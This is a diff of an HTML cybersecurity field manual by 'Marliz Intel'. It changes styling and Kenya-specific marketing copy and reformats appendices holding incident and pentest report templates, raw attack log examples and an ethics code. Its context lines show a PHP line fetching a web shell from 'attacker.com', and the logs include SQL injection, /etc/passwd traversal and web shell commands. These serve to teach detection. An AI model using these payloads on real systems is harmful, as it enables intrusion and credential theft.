@@ -512,18 +512,17 @@
             letter-spacing: 1px;
         }
 
-        .page.back-cover .flag-accent {
+        .page.back-cover .flag-accent,
+        .external-cover .flag-accent {
             position: absolute;
             bottom: 0;
             left: 0;
             right: 0;
-            height: 6px;
-            background: linear-gradient(90deg,
-                    #000000 0%, #000000 33%,
-                    #BB0000 33%, #BB0000 66%,
-                    #006600 66%, #006600 100%);
-            opacity: 0.8;
+            height: 4px;
+            background: linear-gradient(90deg, #00ff9d 0%, #00d4ff 50%, #00ff9d 100%);
+            opacity: 1;
             z-index: 5;
+            box-shadow: 0 0 15px rgba(0, 255, 157, 0.4);
         }
 
         /* --- TYPOGRAPHY --- */
@@ -660,7 +659,7 @@
 
             <div class="subtitle-box">
                 Practical Cybersecurity<br>
-                From The Kenyan<br>
+                From The Global<br>
                 Digital Frontlines
             </div>
         </div>
@@ -2964,7 +2963,7 @@ file_put_contents(&quot;shell.php&quot;, fopen(&quot;http://attacker.com/shell.t
                 Marliz Intel Field Manual</p>
         </div>
     </div>
-    
+
     <div class="page">
         <h1 style="margin-top:100px;">APPENDICES</h1>
     </div>
@@ -2973,31 +2972,56 @@ file_put_contents(&quot;shell.php&quot;, fopen(&quot;http://attacker.com/shell.t
             <h1>Appendix A: DFIR Report Template</h1>
             <hr />
             <p><strong>Marliz Intel Security</strong><br>
-            <strong>Incident Response Report</strong></p>
+                <strong>Incident Response Report</strong>
+            </p>
             <p><strong>Date:</strong> [DATE]<br>
-            <strong>Client:</strong> [CLIENT NAME]<br>
-            <strong>Case ID:</strong> [CASE ID]</p>
+                <strong>Client:</strong> [CLIENT NAME]<br>
+                <strong>Case ID:</strong> [CASE ID]
+            </p>
             <h2>1. Executive Summary</h2>
-            <p>On [DATE], Marliz Intel detectors observed suspicious activity targeting [DOMAIN]. An immediate investigation confirmed that an unauthorized actor had gained access to the system via [VECTOR].</p>
-            <p>The threat was contained at [TIME], and all access was revoked. No sensitive financial data was exfiltrated. The system has been patched and returned to full operational status.</p>
+            <p>On [DATE], Marliz Intel detectors observed suspicious activity targeting [DOMAIN]. An immediate
+                investigation confirmed that an unauthorized actor had gained access to the system via [VECTOR].</p>
+            <p>The threat was contained at [TIME], and all access was revoked. No sensitive financial data was
+                exfiltrated. The system has been patched and returned to full operational status.</p>
             <h2>2. Incident Timeline</h2>
             <table>
                 <thead>
-                    <tr><th>Time (EAT)</th><th>Activity</th><th>Source</th></tr>
+                    <tr>
+                        <th>Time (EAT)</th>
+                        <th>Activity</th>
+                        <th>Source</th>
+                    </tr>
                 </thead>
                 <tbody>
-                    <tr><td>14:00</td><td>Attacker scans port 80</td><td>192.168.1.5</td></tr>
-                    <tr><td>14:05</td><td>SQL Injection payload sent</td><td>192.168.1.5</td></tr>
-                    <tr><td>14:06</td><td>Database dumps user table</td><td>System Logs</td></tr>
-                    <tr><td>14:10</td><td>Marliz Firewall blocks IP</td><td>Automated</td></tr>
+                    <tr>
+                        <td>14:00</td>
+                        <td>Attacker scans port 80</td>
+                        <td>192.168.1.5</td>
+                    </tr>
+                    <tr>
+                        <td>14:05</td>
+                        <td>SQL Injection payload sent</td>
+                        <td>192.168.1.5</td>
+                    </tr>
+                    <tr>
+                        <td>14:06</td>
+                        <td>Database dumps user table</td>
+                        <td>System Logs</td>
+                    </tr>
+                    <tr>
+                        <td>14:10</td>
+                        <td>Marliz Firewall blocks IP</td>
+                        <td>Automated</td>
+                    </tr>
                 </tbody>
             </table>
             <h2>3. Technical Findings</h2>
             <p><strong>Vulnerability:</strong> SQL Injection (SQLi)<br>
-            <strong>Location:</strong> <code>/search.php</code> (Line 42)<br>
-            <strong>Impact:</strong> Full Database Read Access.</p>
+                <strong>Location:</strong> <code>/search.php</code> (Line 42)<br>
+                <strong>Impact:</strong> Full Database Read Access.
+            </p>
             <p><strong>Evidence:</strong><br>
-            [INSERT SCREENSHOT OF LOGS]</p>
+                [INSERT SCREENSHOT OF LOGS]</p>
             <h2>4. Remediation Actions Taken</h2>
             <ol>
                 <li><strong>Patched Code:</strong> Implemented PDO Prepared Statements.</li>
@@ -3011,8 +3035,8 @@ file_put_contents(&quot;shell.php&quot;, fopen(&quot;http://attacker.com/shell.t
                 <li>Schedule a clean-code audit in Q3.</li>
             </ol>
             <p><strong>Signed:</strong><br>
-            John Mark Oguta<br>
-            Lead Analyst, Marliz Intel</p>
+                John Mark Oguta<br>
+                Lead Analyst, Marliz Intel</p>
         </div>
     </div>
     <div class="page">
@@ -3020,27 +3044,51 @@ file_put_contents(&quot;shell.php&quot;, fopen(&quot;http://attacker.com/shell.t
             <h1>Appendix B: Pentest Report Template</h1>
             <hr />
             <p><strong>Marliz Intel Security</strong><br>
-            <strong>Penetration Test Report</strong></p>
+                <strong>Penetration Test Report</strong>
+            </p>
             <p><strong>Target:</strong> [DOMAIN]<br>
-            <strong>Scope:</strong> Black Box (No credentials provided)<br>
-            <strong>Date:</strong> [DATE]</p>
+                <strong>Scope:</strong> Black Box (No credentials provided)<br>
+                <strong>Date:</strong> [DATE]
+            </p>
             <h2>1. Summary of Findings</h2>
-            <p>Our assessment identified <strong>3 Critical</strong> and <strong>2 High</strong> vulnerabilities. The system is currently highly susceptible to compromise.</p>
+            <p>Our assessment identified <strong>3 Critical</strong> and <strong>2 High</strong> vulnerabilities. The
+                system is currently highly susceptible to compromise.</p>
             <h2>2. Risk Matrix</h2>
             <table>
                 <thead>
-                    <tr><th>ID</th><th>Vulnerability</th><th>Severity</th><th>Status</th></tr>
+                    <tr>
+                        <th>ID</th>
+                        <th>Vulnerability</th>
+                        <th>Severity</th>
+                        <th>Status</th>
+                    </tr>
                 </thead>
                 <tbody>
-                    <tr><td>VULN-01</td><td>Remote Code Execution</td><td>Critical</td><td>Open</td></tr>
-                    <tr><td>VULN-02</td><td>Exposed .env File</td><td>Critical</td><td>Open</td></tr>
-                    <tr><td>VULN-03</td><td>Default Admin Credentials</td><td>High</td><td>Open</td></tr>
+                    <tr>
+                        <td>VULN-01</td>
+                        <td>Remote Code Execution</td>
+                        <td>Critical</td>
+                        <td>Open</td>
+                    </tr>
+                    <tr>
+                        <td>VULN-02</td>
+                        <td>Exposed .env File</td>
+                        <td>Critical</td>
+                        <td>Open</td>
+                    </tr>
+                    <tr>
+                        <td>VULN-03</td>
+                        <td>Default Admin Credentials</td>
+                        <td>High</td>
+                        <td>Open</td>
+                    </tr>
                 </tbody>
             </table>
             <h2>3. Detailed Findings</h2>
             <p><strong>VULN-01: Remote Code Execution via File Upload</strong></p>
             <p><strong>Description:</strong><br>
-            The file upload function at <code>/upload.php</code> does not validate file extensions. Multiple PHP shells were successfully uploaded and executed.</p>
+                The file upload function at <code>/upload.php</code> does not validate file extensions. Multiple PHP
+                shells were successfully uploaded and executed.</p>
             <p><strong>Proof of Concept:</strong></p>
             <ol>
                 <li>Created file <code>shell.php</code>.</li>
@@ -3050,9 +3098,11 @@ file_put_contents(&quot;shell.php&quot;, fopen(&quot;http://attacker.com/shell.t
                 <li>Result: <code>www-data</code>.</li>
             </ol>
             <p><strong>Recommendation:</strong><br>
-            Implement a strict whitelist of allowed MIME types (e.g., <code>image/jpeg</code>, <code>image/png</code>) and rename all uploaded files to a random hash.</p>
+                Implement a strict whitelist of allowed MIME types (e.g., <code>image/jpeg</code>,
+                <code>image/png</code>) and rename all uploaded files to a random hash.</p>
             <h2>4. Conclusion</h2>
-            <p>The application requires immediate attention. It is recommended to take the site offline until VULN-01 is patched.</p>
+            <p>The application requires immediate attention. It is recommended to take the site offline until VULN-01 is
+                patched.</p>
         </div>
     </div>
     <div class="page">
@@ -3092,7 +3142,8 @@ file_put_contents(&quot;shell.php&quot;, fopen(&quot;http://attacker.com/shell.t
             <h1>Appendix D: Raw Log Examples</h1>
             <hr />
             <h2>1. SQL Injection / Blind SQLi</h2>
-            <p><strong>Pattern:</strong> <code>UNION SELECT</code>, <code>ORDER BY</code>, single quotes <code>'</code>.</p>
+            <p><strong>Pattern:</strong> <code>UNION SELECT</code>, <code>ORDER BY</code>, single quotes <code>'</code>.
+            </p>
             <pre><code>192.168.1.5 - - [01/Feb/2026:14:00:00 +0300] "GET /product.php?id=1' UNION SELECT 1,user,pass,4 FROM users-- HTTP/1.1" 200 4056</code></pre>
             <h2>2. Directory Scanning (Dirbusters)</h2>
             <p><strong>Pattern:</strong> Rapid 404s for common filenames.</p>
@@ -3104,7 +3155,8 @@ file_put_contents(&quot;shell.php&quot;, fopen(&quot;http://attacker.com/shell.t
             <pre><code>192.168.1.5 - - [01/Feb/2026:14:05:00 +0300] "GET /index.php?page=../../../../etc/passwd HTTP/1.1" 200 1500</code></pre>
             <p>Note: A 200 OK here indicates the attack SUCCEEDED.</p>
             <h2>4. Shell Upload / RCE</h2>
-            <p><strong>Pattern:</strong> <code>POST</code> to upload, followed immediately by <code>GET</code> to the same name.</p>
+            <p><strong>Pattern:</strong> <code>POST</code> to upload, followed immediately by <code>GET</code> to the
+                same name.</p>
             <pre><code>192.168.1.5 - - [01/Feb/2026:14:10:00 +0300] "POST /upload.php HTTP/1.1" 200 45
 192.168.1.5 - - [01/Feb/2026:14:10:05 +0300] "GET /uploads/shell.php?cmd=whoami HTTP/1.1" 200 12</code></pre>
         </div>
@@ -3114,19 +3166,26 @@ file_put_contents(&quot;shell.php&quot;, fopen(&quot;http://attacker.com/shell.t
             <h1>Appendix E: The Marliz Code of Ethics</h1>
             <hr />
             <h2>The Oath of the Grey Hat</h2>
-            <p>As analysts of Marliz Intel, we hold power over the digital lives of businesses in Kenya. With this power comes the obligation to act with integrity.</p>
+            <p>As analysts of Marliz Intel, we hold power over the digital lives of businesses in Kenya. With this power
+                comes the obligation to act with integrity.</p>
             <ol>
-                <li><strong>Authorization:</strong> We never exploit a system for personal gain. We only demonstrate risk.</li>
-                <li><strong>Privacy:</strong> We never look at user data more than is necessary to prove the vulnerability. We never share, sell, or leak PII.</li>
-                <li><strong>Transparency:</strong> We tell the client the whole truth. We do not hide vulnerabilities to ensure future work.</li>
-                <li><strong>Education:</strong> We teach the client how to defend themselves. We do not rely on their ignorance for our job security.</li>
-                <li><strong>Restraint:</strong> We do not destroy. We do not delete. We do not disrupt service unless authorized for a stress test.</li>
+                <li><strong>Authorization:</strong> We never exploit a system for personal gain. We only demonstrate
+                    risk.</li>
+                <li><strong>Privacy:</strong> We never look at user data more than is necessary to prove the
+                    vulnerability. We never share, sell, or leak PII.</li>
+                <li><strong>Transparency:</strong> We tell the client the whole truth. We do not hide vulnerabilities to
+                    ensure future work.</li>
+                <li><strong>Education:</strong> We teach the client how to defend themselves. We do not rely on their
+                    ignorance for our job security.</li>
+                <li><strong>Restraint:</strong> We do not destroy. We do not delete. We do not disrupt service unless
+                    authorized for a stress test.</li>
             </ol>
             <h2>Violations</h2>
-            <p>Any analyst found violating this code will be immediately terminated and reported to the relevant authorities under the Computer Misuse and Cybercrimes Act.</p>
+            <p>Any analyst found violating this code will be immediately terminated and reported to the relevant
+                authorities under the Computer Misuse and Cybercrimes Act.</p>
             <p><strong>Signed:</strong><br>
-            John Mark Oguta<br>
-            Director, Marliz Intel</p>
+                John Mark Oguta<br>
+                Director, Marliz Intel</p>
         </div>
     </div>
     <!-- PAGE: BACK COVER -->
@@ -3160,8 +3219,8 @@ file_put_contents(&quot;shell.php&quot;, fopen(&quot;http://attacker.com/shell.t
                     adversary is scanning your server at 3 AM, and you have 10 minutes to stop them.
                 </p>
                 <p class="description-p">
-                    Born from Kenya's digital frontlines, this field manual documents actual incidents and defense
-                    strategies that turned security skills into consulting income.
+                    Forged in the world's most aggressive digital frontlines, this field manual documents actual
+                    incidents and defense strategies that turned security skills into consulting income.
                 </p>
             </div>
 
@@ -3181,8 +3240,8 @@ file_put_contents(&quot;shell.php&quot;, fopen(&quot;http://attacker.com/shell.t
                 <div class="author-label">ABOUT THE AUTHORS</div>
                 <div class="author-name">JOHN MARK OGUTA & THE MARLIZ INTEL TEAM</div>
                 <div class="author-bio">
-                    John Mark Oguta leads Marliz Intel, a cybersecurity team operating from Nairobi, Kenya. The team
-                    specializes in offensive security, incident response, and security consulting.
+                    John Mark Oguta leads Marliz Intel, a global cybersecurity task force that operates on the
+                    frontlines of offensive security, incident response, and high-stakes security consulting.
                 </div>
             </div>
 
